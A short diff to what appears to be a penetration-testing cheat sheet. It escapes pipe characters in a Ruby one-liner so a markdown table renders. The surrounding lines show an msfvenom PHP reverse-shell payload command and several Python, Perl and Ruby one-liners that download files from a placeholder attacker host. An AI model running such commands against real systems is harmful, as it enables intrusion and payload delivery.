@@ -389,5 +389,5 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 | python3 -c ‘from urllib.request import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’	| The Python urlretrieve function which is part of the urllib library can be used to download files |
 | perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’; | Library for WWW in Perl |
 | perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’	| Library for WWW in Perl |
-| ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do |file|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
+| ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do \|file\|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
 | echo -n “base64-output” > file	| Decoding the base64 output of the file |
